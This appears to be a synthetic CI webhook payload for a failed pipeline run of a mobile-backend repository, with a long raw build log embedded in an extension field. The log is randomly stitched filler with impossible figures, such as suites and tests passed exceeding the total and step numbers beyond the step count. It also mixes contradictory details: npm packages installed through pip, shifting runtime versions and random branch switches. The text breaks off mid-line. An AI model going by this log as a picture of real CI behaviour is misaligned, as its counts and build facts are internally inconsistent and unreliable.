{
  "action": "completed",
  "workflow_run": {
    "id": 319,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "6e7aa4170884e8c7403cbdf1ffcb6380e486d645",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-11-28T12:46:31.767433Z",
    "updated_at": "2025-11-28T12:50:21.157668Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: checkout ===\n[12:46:31] DEBUG: Initializing service\nNODE_ENV=production\nProcessing...\nLoading...\nLoading...\nTest Suites: 42 passed, 9 total\npip: Installing build dependencies...\nCache saved successfully\n[12:46:31] WARN: Deprecated API usage\nUsing Python 3.12\n[12:46:31] DEBUG: Loading configuration\n[12:46:31] DEBUG: Initializing service\n[12:46:31] INFO: Cache refreshed\nCoverage: 71% statements, 85% branches\n[12:46:31] INFO: Request completed\n\u2713 All checks passed\nTransforming 328 files...\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nDone.\nGenerating source maps...\n[12:46:31] DEBUG: Query executed in 63ms\n[12:46:31] INFO: Cache refreshed\nStep 3/24: Building\nyarn add: Done in 24.94s\nTLS handshake completed\n\u2713 Task completed in 2852ms\nBundling main.css\nStep 1/22: Testing\nSuccess!\npip install: Successfully installed express-1.8\nImage pulled successfully\nArtifact downloaded: 39MB\nPulling image: alpine:18\nCompleted.\npip: Installing build dependencies...\npip: Downloading eslint-1.12.tar.gz\nReady.\n\u2713 deploy completed\n\u2713 build completed\nLoading...\nStep 17/18: Building\n\u2713 Step 'build' succeeded\nNODE_ENV=test\n[12:46:31] WARN: Deprecated API usage\nFinished.\n[12:46:31] DEBUG: Query executed in 82ms\nWARNING: react has known vulnerabilities\nException: RuntimeError\nLoading...\nCompiling utils/utils.go...\nOptimizing 61 modules...\nyarn add: Done in 25.55s\nBuilding Docker image...\n  PASS: unit/test_cache_hit.spec.js\nLayer 6/9: ENV command\nLayer 8/8: COPY command\nCompiling components/service.java...\nStep 13/21: Running migrations\n\u2713 package completed\nTLS handshake completed\nStep 8/24: Testing\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 19/22: Running migrations\nOptimizing 81 modules...\n\u2713 Step 'install' succeeded\nLayer 6/11: ENV command\n[12:46:31] ERROR: Connection failed\nSnapshots: 37 passed, 19 total\nWaiting...\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPulling image: node:18\n[12:46:31] DEBUG: Connection pool: 14 active\n[12:46:31] INFO: Processing request\nFinished.\nTest Suites: 50 passed, 26 total\n[12:46:31] DEBUG: Loading configuration\nCache invalidated: build\nGET /health - 201 (25ms)\nWaiting...\n\u2713 Task completed in 1752ms\nCompleted.\nPushing to registry...\nRan 17 tests in 59s\nGET /api - 201 (97ms)\nEnvironment: staging\nTest Suites: 39 passed, 30 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:31] INFO: Cache refreshed\nInstalling express@1.18.3\n\u2713 build completed\nWaiting...\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nRan 65 tests in 60s\nUploading artifact 'coverage' (45 files)\nnpm install: resolved 1687 packages\n[12:46:31] DEBUG: Loading configuration\n[12:46:31] INFO: Connecting to database\nLayer 9/9: RUN command\n[12:46:31] INFO: Request completed\nArtifact uploaded: build.tar.gz (47MB)\nTests: 82 passed, 450 total\nFetching from https://docker.io/package.json\nReady.\nBuilding Docker image...\n[12:46:31] DEBUG: Initializing service\nTests: 454 passed, 390 total\nCompiling lib/index.js...\n[12:46:31] INFO: Connecting to database\nStep 8/22: Running migrations\nReady.\nnpm install: resolved 575 packages\nStep 10/22: Running migrations\npip: Collecting jest\n[12:46:31] INFO: Request completed\nCompiling utils/utils.go...\n\u2713 Task completed in 3292ms\nUploading artifact 'dist' (20 files)\nSnapshots: 29 passed, 5 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\nCompiling lib/handler.rs...\n\u2713 test completed\nDone.\n  PASS: test_api_health (201ms)\nGET /health - 201 (68ms)\n  PASS: test_user_create (251ms)\n[12:46:31] WARN: Deprecated API usage\nReady.\n=== Step checkout completed ===\n=== Step: install_dependencies ===\nSwitched to branch 'bugfix/task-882'\nUsing Node.js 18.2.1\nLoading...\nLayer 10/10: RUN command\nWaiting...\nArtifact uploaded: dist.zip (39MB)\n[12:46:31] INFO: Starting build process\nRan 100 tests in 16s\nHEAD is now at cdb28c3\nConnection established\nnpm notice: package.json updated\nCompleted.\nUploading artifact 'coverage' (22 files)\nnpm notice: package.json updated\nTests: 198 passed, 236 total\nnpm install: added 66 packages\nStep 15/18: Building\n[12:46:31] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: package.json updated\nPulling image: python:18\nOptimizing 67 modules...\nStep 11/20: Building\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 All checks passed\nBuilding Docker image...\nArtifact uploaded: dist.zip (47MB)\npip: Collecting webpack\nRan 49 tests in 50s\nnpm notice: package.json updated\nLayer 2/12: ENV command\n[12:46:31] DEBUG: Initializing service\nReady.\npip install: Successfully installed express-1.12\n[12:46:31] DEBUG: Connection pool: 7 active\nGenerating source maps...\nStep 15/23: Linting\n\u2713 Task completed in 388ms\nCompiling lib/main.py...\n[12:46:31] WARN: Deprecated API usage\nStep 15/22: Linting\nAlready up to date.\nFetching submodules...\nProcessing...\nSnapshots: 7 passed, 32 total\nTransforming 427 files...\nCache hit for key-7870\nImage pulled successfully\nInstalling webpack@1.13.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:31] DEBUG: Memory usage: 763MB\nnpm install: resolved 1952 packages\nProcessing...\nPulling image: python:3.11\nPlatform: win32-x64\nPOST /upload - 202 (164ms)\nWARNING: express has known vulnerabilities\nArtifact downloaded: 39MB\n[12:46:31] INFO: Cache refreshed\nStep 10/21: Linting\nCache hit for key-6893\nAlready up to date.\n\u2713 test completed\n[12:46:31] INFO: Processing request\nFAILED: test_api_health\nBuilding Docker image...\nSuccess!\nCache restored successfully (449MB)\nnpm notice: package.json updated\nSuccess!\nFetching from https://registry.npmjs.org/package.json\n  PASS: test_api_health (256ms)\nCoverage: 70% statements, 68% branches\npip: Collecting webpack\n[12:46:31] WARN: Deprecated API usage\nSnapshots: 18 passed, 29 total\nCoverage: 71% statements, 87% branches\nInstalling lodash@3.20.10\nSuccess!\nFetching from https://gcr.io/package.json\nFetching submodules...\nnpm install: added 278 packages\nConnection established\nPushing to registry...\nEnvironment: production\nReady.\nMinifying main.js\n\u2713 All checks passed\nInstalling eslint@4.1.10\nCache miss for key-3699\nCache miss for key-4381\npip: Collecting prettier\nPOST /api - 200 (127ms)\nTests: 458 passed, 201 total\nCache miss for key-9104\nDone.\nCompiling lib/main.py...\nBuilding Docker image...\nCache saved successfully\nConnection established\nBundling main.css\nCache miss for key-5680\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOK\nTransforming 915 files...\n[12:46:31] INFO: Cache refreshed\nPushing to registry...\nCompiling lib/service.java...\nUsing Python 3.11\nInstalling eslint@4.4.4\nDone.\npip: Downloading webpack-4.17.tar.gz\nPulling image: python:18\nFAILED: test_user_create\nDone.\nStep 6/15: Testing\nnpm notice: package.json updated\nStep 17/25: Deploying\npip install: Successfully installed lodash-2.13\nStep 15/19: Testing\n[12:46:31] INFO: Cache refreshed\nFAILED: test_auth_login\nHEAD is now at 90e2208\nBundling vendor.js\nCompiling utils/utils.go...\nFetching submodules...\nCompiling lib/app.ts...\nStep 12/21: Running migrations\n[12:46:31] DEBUG: Query executed in 79ms\n[12:46:31] WARN: Deprecated API usage\nCache saved successfully\n=== Step install_dependencies completed ===\n=== Step: setup_environment ===\n[12:46:31] DEBUG: Initializing service\nUsing Node.js 20.12.4\nnpm install: resolved 524 packages\nVerifying...\nStep 6/15: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTests: 154 passed, 448 total\nCreating production build...\nUsing Python 3.10\nDone.\nPushing to registry...\n[12:46:31] INFO: Request completed\nArtifact uploaded: dist.zip (32MB)\nArtifact uploaded: build.tar.gz (22MB)\n\u2713 All checks passed\nImage pulled successfully\n\u2713 build completed\nVerifying...\n  PASS: test_user_create (494ms)\nCache restored successfully (495MB)\nAlready up to date.\nHEAD is now at 802885a\nException: ValueError\nException: NullPointerException\n[12:46:31] INFO: Request completed\n\u2713 deploy completed\nPOST /data - 200 (108ms)\nnpm install: resolved 281 packages\npip install: Successfully installed eslint-1.14\nTest Suites: 38 passed, 6 total\nFAILED: test_auth_login\nStep 3/16: Deploying\nTLS handshake completed\nCache saved successfully\nUploading artifact 'dist' (5 files)\nWaiting...\nOK\nGenerating source maps...\nCompiling src/main.py...\nSwitched to branch 'bugfix/task-802'\n\u2713 Step 'build' succeeded\nVerifying...\nMinifying app.js\nLayer 6/12: ENV command\nSnapshots: 47 passed, 2 total\n[12:46:31] WARN: Deprecated API usage\nWaiting...\nHEAD is now at 13dcacf\nTest Suites: 39 passed, 24 total\n[12:46:31] DEBUG: Initializing service\n\u2713 Task completed in 1837ms\nCoverage: 92% statements, 66% branches\nUsing Node.js 14.0.8\nWaiting...\nEnvironment: development\n[12:46:31] INFO: Request completed\n[12:46:31] DEBUG: Connection pool: 20 active\n[12:46:31] INFO: Request completed\nHEAD is now at b7b2909\nTransforming 730 files...\nTest Suites: 15 passed, 23 total\n[12:46:31] WARN: Deprecated API usage\nInstalling axios@5.6.4\nConnection established\nVerifying...\nnpm install: resolved 698 packages\npip: Downloading webpack-2.16.tar.gz\nInstalling axios@4.9.7\n[12:46:31] INFO: Cache refreshed\nSwitched to branch 'bugfix/task-841'\nCache invalidated: build\nConnection established\n[12:46:31] DEBUG: Connection pool: 11 active\nVerifying...\nException: RuntimeError\n\u2713 Task completed in 1699ms\nPOST /upload - 200 (450ms)\n[12:46:31] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nAlready up to date.\nStep 2/18: Installing dependencies\nnpm notice: package.json updated\nnpm install: added 126 packages\nStep 11/17: Building\n[12:46:31] INFO: Cache refreshed\nChecking out main branch\nLayer 3/10: COPY command\nCache saved successfully\nUploading artifact 'coverage' (44 files)\nArtifact downloaded: 49MB\nCompiling components/app.ts...\nChecking out master branch\nCompiling components/utils.go...\nStep 9/18: Running migrations\n[12:46:31] DEBUG: Memory usage: 106MB\n[12:46:31] DEBUG: Query executed in 69ms\nMinifying vendor.js\nStep 20/20: Building\nCache saved successfully\nTransforming 724 files...\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:31] INFO: Connecting to database\nHEAD is now at d41593d\nUsing Python 3.11\npip: Collecting react\npip install: Successfully installed lodash-1.18\nArtifact uploaded: build.tar.gz (13MB)\nCache miss for key-5654\nBundling runtime.css\nBuilding Docker image...\n[12:46:31] WARN: Deprecated API usage\nStep 20/18: Installing dependencies\nCompleted.\nStep 17/15: Running migrations\n[12:46:31] DEBUG: Query executed in 11ms\nTransforming 790 files...\nWARNING: eslint has known vulnerabilities\nBundling styles.js\nTest Suites: 9 passed, 10 total\nCreating production build...\nCompiling utils/handler.rs...\nConnection established\nStep 15/21: Installing dependencies\nSwitched to branch 'bugfix/task-593'\nWARNING: react has known vulnerabilities\nyarn add: Done in 26.32s\nException: NullPointerException\nCache saved successfully\nEnvironment: test\nFinished.\nStep 13/21: Running migrations\n=== Step setup_environment completed ===\n=== Step: deploy_staging ===\nDone.\nNODE_ENV=development\nOptimizing 28 modules...\nBuilding Docker image...\nStep 8/20: Linting\nArtifact uploaded: dist.zip (99MB)\nCache hit for key-4057\nWARNING: express has known vulnerabilities\n[12:46:31] WARN: Deprecated API usage\npip: Downloading prettier-4.9.tar.gz\n[12:46:31] DEBUG: Memory usage: 150MB\nHEAD is now at 7f41c68\nBundling runtime.js\n\u2713 Step 'test' succeeded\nCompiling components/handler.rs...\n\u2713 Step 'setup' succeeded\n[12:46:31] WARN: Deprecated API usage\n  PASS: unit/test_db_connect.spec.js\nArtifact uploaded: dist.zip (77MB)\nOK\n[12:46:31] DEBUG: Connection pool: 10 active\nRan 35 tests in 59s\npip: Downloading express-1.13.tar.gz\nLoading...\n[12:46:31] WARN: Deprecated API usage\n\u2713 All checks passed\n[12:46:31] INFO: Starting build process\nnpm notice: created a lockfile\nPushing to registry...\nWARNING: lodash has known vulnerabilities\nCompiling src/handler.rs...\nTest Suites: 49 passed, 40 total\nWaiting...\nArtifact uploaded: build.tar.gz (14MB)\n  PASS: unit/test_user_create.spec.js\n\u2717 build failed with exit code 63\nCompiling components/app.ts...\nCache saved successfully\nTests: 189 passed, 94 total\nnpm install: added 411 packages\nStep 8/24: Installing dependencies\nCompiling lib/utils.go...\nStep 1/18: Testing\nImage pulled successfully\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (29MB)\nFAILED: test_api_health\nCache restored successfully (46MB)\nUsing Node.js 19.12.6\nVerifying...\n\u2717 build failed with exit code 58\nLayer 6/14: COPY command\n[12:46:31] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (48MB)\nRan 113 tests in 12s\nnpm notice: created a lockfile\nBuilding Docker image...\nStep 15/25: Building\nOK\nGET /status - 200 (47ms)\nTransforming 868 files...\n[12:46:31] DEBUG: Initializing service\nAlready up to date.\nCache hit for key-2979\nFetching from https://githubusercontent.com/package.json\nnpm install: resolved 811 packages\n\u2713 Task completed in 1437ms\n[12:46:31] INFO: Connecting to database\nnpm install: resolved 979 packages\nOptimizing 86 modules...\nArtifact uploaded: build.tar.gz (6MB)\n[12:46:31] DEBUG: Connection pool: 8 active\nCache miss for key-9349\nLoading...\nnpm install: added 271 packages\nSuccess!\nHEAD is now at 82a473a\nMinifying app.js\nFinished.\nPOST /api - 202 (86ms)\nStep 16/18: Linting\nSnapshots: 49 passed, 28 total\nFetching from https://registry.npmjs.org/package.json\nWARNING: eslint has known vulnerabilities\n[12:46:31] WARN: Deprecated API usage\nHEAD is now at 4462cb1\n  PASS: e2e/test_cache_hit.spec.js\nWARNING: axios has known vulnerabilities\nStep 20/21: Installing dependencies\npip: Collecting prettier\n[12:46:31] DEBUG: Initializing service\npip: Collecting webpack\nCompleted.\nImage pulled successfully\nStep 3/21: Testing\npip: Installing build dependencies...\nVerifying...\nBundling vendor.css\n[12:46:31] DEBUG: Connection pool: 2 active\nArtifact downloaded: 24MB\nSuccess!\nSnapshots: 3 passed, 22 total\nGenerating source maps...\n[12:46:31] DEBUG: Connection pool: 14 active\nCompiling components/service.java...\nGenerating source maps...\nLoading...\nCache restored successfully (396MB)\nCompiling lib/index.js...\nCompleted.\nRan 156 tests in 49s\n[12:46:31] INFO: Starting build process\nUploading artifact 'coverage' (33 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 223 files...\nArtifact uploaded: build.tar.gz (50MB)\nProcessing...\nStep 14/17: Installing dependencies\nStep 14/16: Linting\n[12:46:31] WARN: Deprecated API usage\nImage pulled successfully\nVerifying...\nRan 145 tests in 14s\n\u2713 All checks passed\n[12:46:31] DEBUG: Loading configuration\nConnection established\nMinifying app.js\npip install: Successfully installed prettier-5.12\nGenerating source maps...\npip: Downloading webpack-4.9.tar.gz\n\u2713 Task completed in 3089ms\nPlatform: win32-x64\n=== Step deploy_staging completed ===\n=== Step: unit_tests ===\n\u2713 Task completed in 1724ms\n[12:46:31] WARN: Deprecated API usage\nPushing to registry...\n\u2713 validate completed\nPulling image: python:18\nCache hit for key-1431\nStep 15/19: Installing dependencies\nChecking out develop branch\nTime: 77.861s\nTests: 117 passed, 417 total\nCache invalidated: build\nUsing Node.js 14.18.5\nArtifact uploaded: dist.zip (32MB)\nyarn add: Done in 1.50s\nFetching from https://amazonaws.com/package.json\nEnvironment: development\nnpm notice: created a lockfile\nReady.\nHEAD is now at a0c711a\nStep 18/24: Deploying\nRan 110 tests in 42s\npip: Downloading express-2.4.tar.gz\nGET /status - 201 (43ms)\nLoading...\nOK\nChecking out develop branch\nConnection established\nSuccess!\n\u2713 validate completed\nProcessing...\n  PASS: test_api_health (471ms)\nCompiling utils/index.js...\nFinished.\n[12:46:31] ERROR: Connection failed\nSnapshots: 37 passed, 6 total\nnpm install: added 364 packages\nBundling styles.js\nSwitched to branch 'bugfix/task-206'\n[12:46:31] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nAlready up to date.\nTLS handshake completed\n\u2717 build failed with exit code 67\nReady.\nArtifact uploaded: build.tar.gz (11MB)\nCompiling utils/utils.go...\nBuilding Docker image...\nStep 13/19: Linting\n[12:46:31] WARN: Deprecated API usage\nOptimizing 64 modules...\n[12:46:31] INFO: Request completed\n[12:46:31] INFO: Connecting to database\nyarn add: Done in 5.55s\n  PASS: unit/test_user_create.spec.js\nCache restored successfully (150MB)\nCache hit for key-3531\nProcessing...\n[12:46:31] DEBUG: Initializing service\nUsing Node.js 16.19.5\n[12:46:31] DEBUG: Connection pool: 8 active\nChecking out develop branch\nnpm install: added 295 packages\npip install: Successfully installed lodash-2.0\nFetching from https://gcr.io/package.json\nTests: 240 passed, 66 total\nProcessing...\nSwitched to branch 'bugfix/task-571'\nTime: 115.60s\nPushing to registry...\nCompiling components/app.ts...\nSwitched to branch 'hotfix/task-547'\nCache miss for key-1709\nConnection established\nTLS handshake completed\nLoading...\nLoading...\nCreating production build...\n\u2713 Step 'checkout' succeeded\nDone.\nDone.\nCreating production build...\n[12:46:31] INFO: Request completed\nTLS handshake completed\nStep 8/20: Building\nWARNING: lodash has known vulnerabilities\nException: TypeError\nFinished.\nSuccess!\nCache miss for key-6105\nPOST /upload - 200 (466ms)\nWARNING: webpack has known vulnerabilities\n[12:46:31] ERROR: Connection failed\nPOST /api - 200 (78ms)\nUsing Python 3.11\nFetching from https://googleapis.com/package.json\nStep 15/21: Testing\nTLS handshake completed\nImage pulled successfully\nPulling image: python:latest\nnpm notice: package.json updated\nCache saved successfully\nEnvironment: development\npip install: Successfully installed express-2.4\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\nTLS handshake completed\n[12:46:31] INFO: Request completed\n[12:46:31] INFO: Starting build process\nStep 11/19: Deploying\n  PASS: unit/test_api_health.spec.js\nImage pulled successfully\n[12:46:31] INFO: Connecting to database\nCompiling utils/index.js...\nArtifact downloaded: 15MB\nUsing Node.js 15.5.1\nStep 4/24: Building\n[12:46:31] WARN: Deprecated API usage\nyarn add: Done in 19.25s\nEnvironment: staging\nCache saved successfully\nOK\nConnection established\nnpm install: added 178 packages\n[12:46:31] INFO: Starting build process\n[12:46:31] WARN: Deprecated API usage\nPushing to registry...\nSnapshots: 12 passed, 44 total\nCache invalidated: node_modules\nPlatform: win32-x64\nFinished.\nRan 121 tests in 1s\nStep 17/21: Running migrations\n=== Step unit_tests completed ===\n=== Step: setup_node ===\n[12:46:31] DEBUG: Connection pool: 14 active\nPushing to registry...\nInstalling react@3.10.7\nChecking out master branch\nnpm notice: package.json updated\n[12:46:31] DEBUG: Connection pool: 3 active\nCreating production build...\nArtifact uploaded: dist.zip (66MB)\nnpm notice: created a lockfile\nnpm install: resolved 574 packages\nnpm notice: created a lockfile\nnpm install: resolved 355 packages\nBundling main.css\nImage pulled successfully\nWaiting...\npip: Installing build dependencies...\nFinished.\nCompiling utils/index.js...\nSwitched to branch 'feature/task-151'\nUsing Node.js 18.18.6\nCompiling utils/service.java...\n\u2713 Step 'checkout' succeeded\nFinished.\nCache restored successfully (244MB)\nCompiling utils/main.py...\nStep 6/19: Deploying\nSwitched to branch 'bugfix/task-314'\n\u2713 Task completed in 2467ms\nnpm notice: package.json updated\nCompiling src/utils.go...\nRan 56 tests in 43s\nCompiling lib/utils.go...\nCache hit for key-1067\nCoverage: 82% statements, 62% branches\n[12:46:31] WARN: Deprecated API usage\nUploading artifact 'dist' (10 files)\nPlatform: win32-x64\nCache hit for key-3732\nConnection established\nPulling image: alpine:latest\n[12:46:31] DEBUG: Loading configuration\nImage pulled successfully\nSnapshots: 45 passed, 49 total\npip install: Successfully installed eslint-3.2\nTransforming 422 files...\nCompiling src/index.js...\nVerifying...\nStep 11/21: Running migrations\npip install: Successfully installed lodash-2.3\n  PASS: test_auth_login (372ms)\npip: Downloading axios-3.0.tar.gz\nVerifying...\n  PASS: integration/test_auth_login.spec.js\npip: Downloading lodash-1.14.tar.gz\nSwitched to branch 'bugfix/task-592'\nFinished.\n[12:46:31] INFO: Request completed\nConnection established\nGET /status - 204 (5ms)\nUsing Python 3.10\n[12:46:31] INFO: Connecting to database\nPushing to registry...\nInstalling express@1.5.6\nNODE_ENV=production\nUploading artifact 'coverage' (42 files)\nCompiling components/handler.rs...\nnpm notice: package.json updated\nStep 12/17: Linting\npip: Collecting react\nFetching from https://github.com/package.json\n  PASS: test_cache_hit (166ms)\nCoverage: 75% statements, 60% branches\nException: RuntimeError\nnpm notice: created a lockfile\nTransforming 978 files...\nStep 17/25: Testing\nTransforming 277 files...\nCache saved successfully\n[12:46:31] INFO: Starting build process\nCompiling components/app.ts...\n[12:46:31] INFO: Connecting to database\nStep 18/25: Linting\nFAILED: test_api_health\nLoading...\nPOST /upload - 202 (266ms)\n[12:46:31] DEBUG: Connection pool: 14 active\nFinished.\nBundling vendor.css\nCompiling src/app.ts...\nWaiting...\nWARNING: webpack has known vulnerabilities\nCompiling utils/app.ts...\n\u2713 Task completed in 661ms\nPOST /data - 200 (223ms)\n  PASS: unit/test_cache_hit.spec.js\nPushing to registry...\nInstalling react@2.17.0\nSuccess!\nFetching from https://gcr.io/package.json\nnpm notice: package.json updated\nCreating production build...\nArtifact uploaded: build.tar.gz (25MB)\nImage pulled successfully\nWARNING: lodash has known vulnerabilities\nProcessing...\n[12:46:31] INFO: Processing request\n\u2717 build failed with exit code 49\nImage pulled successfully\nCache miss for key-9762\n[12:46:31] DEBUG: Memory usage: 237MB\nUsing Python 3.12\nDone.\n\u2713 All checks passed\nCache invalidated: build\nRan 108 tests in 42s\nTime: 8.320s\nTests: 265 passed, 243 total\nTime: 51.128s\nFetching submodules...\nCompiling src/utils.go...\nUsing Node.js 15.8.8\nImage pulled successfully\nProcessing...\nImage pulled successfully\nArtifact uploaded: build.tar.gz (17MB)\n[12:46:31] WARN: Deprecated API usage\nnpm notice: package.json updated\nNODE_ENV=development\nOK\nPulling image: python:3.11\nnpm install: resolved 1667 packages\nStep 20/17: Deploying\n=== Step setup_node completed ===\n=== Step: build ===\nCompiling utils/main.py...\nStep 18/17: Linting\nPOST /data - 202 (431ms)\nOK\npip install: Successfully installed axios-4.3\n[12:46:31] DEBUG: Connection pool: 7 active\nSuccess!\nCoverage: 85% statements, 84% branches\n[12:46:31] DEBUG: Connection pool: 2 active\nMinifying vendor.js\nImage pulled successfully\nUsing Node.js 19.6.7\nGenerating source maps...\nyarn add: Done in 14.9s\nEnvironment: staging\n[12:46:31] WARN: Deprecated API usage\nyarn add: Done in 10.84s\nWaiting...\nFetching from https://amazonaws.com/package.json\nHEAD is now at 76fa4fb\n[12:46:31] DEBUG: Loading configuration\nOK\nArtifact uploaded: build.tar.gz (15MB)\n[12:46:31] DEBUG: Memory usage: 1226MB\n\u2713 package completed\nChecking out develop branch\n[12:46:31] INFO: Processing request\nUsing Node.js 16.11.1\n\u2713 All checks passed\n[12:46:31] DEBUG: Query executed in 74ms\nTime: 15.311s\nLayer 2/14: ENV command\nBundling styles.css\n[12:46:31] INFO: Cache refreshed\nArtifact downloaded: 17MB\nCompiling components/app.ts...\nnpm notice: package.json updated\n[12:46:31] ERROR: Connection failed\n[12:46:31] DEBUG: Initializing service\nAlready up to date.\n[12:46:31] DEBUG: Query executed in 33ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nFinished.\nCompiling utils/handler.rs...\nNODE_ENV=test\nOK\nUploading artifact 'build' (32 files)\nLoading...\nCompiling src/index.js...\nCache miss for key-5296\nyarn add: Done in 14.18s\nCache restored successfully (235MB)\nSwitched to branch 'feature/task-133'\nStep 13/24: Running migrations\nMinifying main.js\nConnection established\nCache restored successfully (477MB)\nEnvironment: staging\n\u2713 build completed\nnpm install: added 230 packages\n[12:46:31] DEBUG: Memory usage: 1441MB\nTime: 75.975s\nWaiting...\nnpm install: resolved 1273 packages\nFinished.\n[12:46:31] DEBUG: Memory usage: 896MB\nNODE_ENV=development\nCoverage: 81% statements, 88% branches\nConnection established\n[12:46:31] WARN: Deprecated API usage\n[12:46:31] INFO: Cache refreshed\nCache restored successfully (170MB)\nGenerating source maps...\nCache invalidated: node_modules\nEnvironment: staging\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPulling image: node:latest\nChecking out master branch\nWARNING: lodash has known vulnerabilities\n[12:46:31] INFO: Cache refreshed\n[12:46:31] INFO: Cache refreshed\nDone.\nDone.\nCache invalidated: dependencies\nOptimizing 90 modules...\nFetching submodules...\n[12:46:31] INFO: Cache refreshed\n[12:46:31] WARN: Deprecated API usage\nCompiling components/handler.rs...\nSuccess!\nChecking out master branch\nImage pulled successfully\nArtifact uploaded: dist.zip (46MB)\nnpm notice: created a lockfile\nCache saved successfully\nCompiling src/app.ts...\n[12:46:31] INFO: Starting build process\nCompiling utils/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling utils/utils.go...\n\u2713 Task completed in 2225ms\nOK\n\u2713 deploy completed\n\u2713 Task completed in 4730ms\n\u2713 Task completed in 2434ms\nCache hit for key-5249\nWaiting...\nyarn add: Done in 7.16s\n[12:46:31] DEBUG: Loading configuration\n[12:46:31] INFO: Request completed\nStep 1/22: Deploying\nTests: 375 passed, 355 total\nnpm install: added 177 packages\nArtifact uploaded: build.tar.gz (42MB)\nFetching from https://github.com/package.json\nHEAD is now at 33a08c5\nnpm install: added 268 packages\nPOST /data - 200 (148ms)\nWaiting...\nUsing Node.js 16.1.9\nStep 19/20: Running migrations\nArtifact downloaded: 11MB\nTests: 467 passed, 441 total\nCompleted.\nTime: 29.874s\nImage pulled successfully\nTests: 368 passed, 454 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 7/24: Running migrations\nFAILED: test_db_connect\n=== Step build completed ===\n=== Step: upload_artifacts ===\nSwitched to branch 'hotfix/task-946'\n[12:46:31] WARN: Deprecated API usage\n[12:46:31] WARN: Deprecated API usage\n[12:46:31] DEBUG: Connection pool: 4 active\n[12:46:31] DEBUG: Connection pool: 14 active\nArtifact uploaded: build.tar.gz (17MB)\nSnapshots: 14 passed, 3 total\nUploading artifact 'dist' (10 files)\nCache restored successfully (217MB)\n\u2713 All checks passed\nStep 11/19: Deploying\nCompiling utils/index.js...\nnpm notice: package.json updated\nTLS handshake completed\nSnapshots: 47 passed, 2 total\nCache hit for key-1440\nUsing Node.js 20.1.0\nArtifact downloaded: 30MB\nPOST /upload - 200 (486ms)\nStep 13/17: Testing\nInstalling jest@5.20.9\nTLS handshake completed\nTests: 197 passed, 401 total\nImage pulled successfully\nOptimizing 62 modules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 33MB\nBuilding Docker image...\nRan 76 tests in 57s\nWARNING: react has known vulnerabilities\nWARNING: prettier has known vulnerabilities\n\u2713 Step 'setup' succeeded\nLoading...\nCompiling lib/main.py...\nInstalling axios@3.2.6\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nyarn add: Done in 27.69s\nProcessing...\nyarn add: Done in 11.52s\n[12:46:31] INFO: Cache refreshed\nStep 6/15: Running migrations\n[12:46:31] DEBUG: Loading configuration\nCache invalidated: build\nPOST /api - 200 (12ms)\nDone.\n[12:46:31] WARN: Deprecated API usage\nInstalling eslint@5.8.3\nUsing Node.js 17.18.8\nNODE_ENV=development\nReady.\nCache restored successfully (145MB)\nCache invalidated: build\nWARNING: prettier has known vulnerabilities\n  PASS: test_cache_hit (186ms)\nPOST /api - 202 (256ms)\nMinifying vendor.js\nGenerating source maps...\nTest Suites: 31 passed, 10 total\nArtifact downloaded: 26MB\nProcessing...\nnpm install: added 184 packages\nPOST /api - 200 (280ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (3MB)\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (35MB)\nOK\nCompiling utils/handler.rs...\n[12:46:31] DEBUG: Query executed in 92ms\n  PASS: unit/test_cache_hit.spec.js\nCompiling lib/handler.rs...\nTime: 49.619s\nPushing to registry...\nLayer 7/9: RUN command\nUploading artifact 'dist' (37 files)\npip: Downloading react-3.6.tar.gz\nCreating production build...\nFetching submodules...\nArtifact uploaded: build.tar.gz (5MB)\nFAILED: test_cache_hit\n[12:46:31] WARN: Deprecated API usage\npip: Downloading jest-4.11.tar.gz\nProcessing...\nCache miss for key-3669\nSwitched to branch 'bugfix/task-977'\nUploading artifact 'dist' (48 files)\nVerifying...\nTransforming 297 files...\nBuilding Docker image...\n\u2713 All checks passed\n[12:46:31] ERROR: Connection failed\nStep 8/24: Installing dependencies\nBuilding Docker image...\npip: Downloading jest-1.4.tar.gz\nyarn add: Done in 14.22s\nSwitched to branch 'feature/task-415'\nUsing Node.js 16.10.0\nArtifact uploaded: dist.zip (13MB)\nPOST /data - 202 (321ms)\nNODE_ENV=development\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:31] WARN: Deprecated API usage\nProcessing...\nFAILED: test_auth_login\n[12:46:31] INFO: Cache refreshed\nCache hit for key-3528\nnpm notice: created a lockfile\n  PASS: integration/test_db_connect.spec.js\nUsing Python 3.10\nHEAD is now at b4ddc9d\nStep 13/24: Linting\nInstalling 